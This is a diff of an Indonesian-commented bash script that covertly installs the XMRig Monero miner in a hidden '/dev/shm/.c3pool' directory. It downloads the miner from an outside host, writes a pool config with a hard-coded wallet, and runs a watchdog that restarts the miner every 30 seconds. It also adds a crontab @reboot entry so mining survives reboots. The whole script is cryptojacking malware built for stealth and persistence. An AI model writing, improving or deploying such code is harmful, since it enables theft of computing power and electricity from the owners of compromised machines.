@@ -1,48 +1,113 @@
 #!/bin/bash
-# Konfigurasi Wallet
-WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"
 
-# Path stealth
+# ===== Konfigurasi =====
+WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"
 STEALTH_DIR="/dev/shm/.c3pool"
 MINER_SUBDIR="$STEALTH_DIR/c3pool"
+
+# ===== Setup Direktori =====
 mkdir -p "$MINER_SUBDIR"
+cd "$MINER_SUBDIR" || exit 1
 
-# Instalasi
-echo "[*] Installing C3Pool -> $MINER_SUBDIR ..."
-curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | env HOME="$STEALTH_DIR" LC_ALL=en_US.UTF-8 bash -s "$WALLET"
-sleep 5
+# ===== Unduh dan Ekstrak xmrig =====
+echo "[*] Mengunduh xmrig.tar.gz..."
+curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz
 
-# Buat watchdog
-echo "[*] Creating watchdog..."
-cat > "$STEALTH_DIR/watchdog.sh" << 'EOF'
+if file xmrig.tar.gz | grep -q 'gzip compressed'; then
+    echo "[*] Mengekstrak..."
+    tar -xzf xmrig.tar.gz
+    chmod +x xmrig
+else
+    echo "[!] Gagal: Bukan file gzip valid"
+    exit 1
+fi
+
+# ===== Cek Eksekusi xmrig =====
+if ! ./xmrig --help > /dev/null 2>&1; then
+    echo "[!] xmrig tidak dapat dijalankan, kemungkinan /dev/shm noexec"
+    TMP_BIN="/tmp/xmrig"
+    cp xmrig "$TMP_BIN"
+    chmod +x "$TMP_BIN"
+    if "$TMP_BIN" --help > /dev/null 2>&1; then
+        echo "[*] xmrig dapat dijalankan dari /tmp"
+        echo "$TMP_BIN" > "$MINER_SUBDIR/.binpath"
+    else
+        echo "[!] Gagal menjalankan xmrig di /tmp juga"
+        exit 1
+    fi
+else
+    echo "$MINER_SUBDIR/xmrig" > "$MINER_SUBDIR/.binpath"
+fi
+
+# ===== Buat konfigurasi =====
+cat > config_background.json <<EOF
+{
+    "autosave": true,
+    "background": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.c3pool.com:13333",
+            "user": "$WALLET",
+            "pass": "c3pool",
+            "keepalive": true,
+            "tls": false
+        }
+    ]
+}
+EOF
+
+# ===== Watchdog Script =====
+echo "[*] Membuat watchdog.sh..."
+cat > "$STEALTH_DIR/watchdog.sh" <<'EOF'
 #!/bin/bash
-MINER_DIR="/dev/shm/.c3pool/c3pool"
-MINER_BIN="$MINER_DIR/xmrig"
-CONFIG="$MINER_DIR/config_background.json"
-LOGFILE="$MINER_DIR/xmrig.log"
+BIN=$(cat /dev/shm/.c3pool/c3pool/.binpath)
+CONFIG="/dev/shm/.c3pool/c3pool/config_background.json"
+LOGFILE="/dev/shm/.c3pool/c3pool/xmrig.log"
 
 while true; do
-    if ! pgrep -f "$MINER_BIN" > /dev/null; then
-        echo "[$(date)] xmrig not running. Starting..." >> "$LOGFILE"
-        nohup "$MINER_BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
+    if ! pgrep -f "$BIN" > /dev/null; then
+        echo "[$(date)] xmrig tidak berjalan. Memulai ulang..." >> "$LOGFILE"
+        "$BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
     fi
-    sleep 30 
+    sleep 30
 done
 EOF
 
 chmod +x "$STEALTH_DIR/watchdog.sh"
-
-# Jalankan watchdog
 pkill -f "$STEALTH_DIR/watchdog.sh" 2>/dev/null
-echo "[*] Running watchdog -> background..."
-nohup bash "$STEALTH_DIR/watchdog.sh" > /dev/null 2>&1 &
 
-# Tambahkan ke crontab
-if command -v crontab >/dev/null 2>&1; then
-    echo "[*] Add watchdog -> crontab @reboot..."
-    (crontab -l 2>/dev/null; echo "@reboot nohup $STEALTH_DIR/watchdog.sh > /dev/null 2>&1 &") | crontab -
+# ===== Jalankan Watchdog =====
+echo "[*] Menjalankan watchdog di background..."
+
+if command -v bash >/dev/null 2>&1; then
+    CMD="bash \"$STEALTH_DIR/watchdog.sh\""
 else
-    echo "[!] crontab Not Found, Skip auto-reboot."
+    CMD="sh \"$STEALTH_DIR/watchdog.sh\""
 fi
 
-echo "[✓] Done. Miner Saved -> $MINER_SUBDIR & run -> background."
+if command -v nohup >/dev/null 2>&1; then
+    eval "nohup $CMD > /dev/null 2>&1 &"
+else
+    eval "$CMD > /dev/null 2>&1 &"
+fi
+
+# ===== Verifikasi =====
+sleep 2
+if pgrep -f "watchdog.sh" > /dev/null; then
+    echo "[✓] Watchdog aktif di background."
+else
+    echo "[!] Gagal menjalankan watchdog!"
+fi
+
+# ===== Tambahkan ke crontab jika ada =====
+if command -v crontab >/dev/null 2>&1; then
+    (crontab -l 2>/dev/null; echo "@reboot $CMD > /dev/null 2>&1 &") | crontab -
+    echo "[*] Cron @reboot ditambahkan."
+else
+    echo "[!] crontab tidak ditemukan. Lewati autostart."
+fi
+
+echo "[✓] Selesai. xmrig disimpan di: $(cat "$MINER_SUBDIR/.binpath")"
